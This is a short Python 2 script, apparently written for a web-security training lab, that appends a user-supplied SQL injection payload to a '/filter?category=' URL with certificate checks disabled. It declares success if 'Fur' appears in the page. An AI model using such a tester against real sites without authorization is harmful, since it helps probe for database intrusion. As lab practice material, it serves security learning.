#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def lab1_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False)
    if 'Fur' in r.text:
        return True
    else:
        return False


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print '[*] Usage: lab1-sqli.py <url> <payload>'
        print '[*] Example: lab1-sqli.py https://example.com "1=1"'
        sys.exit(-1)

    if lab1_sqli(url, payload):
        print '[*]Boom[*] SQL injection successful!'
    else:
        print ' :-( SQL injection unsuccessful!'
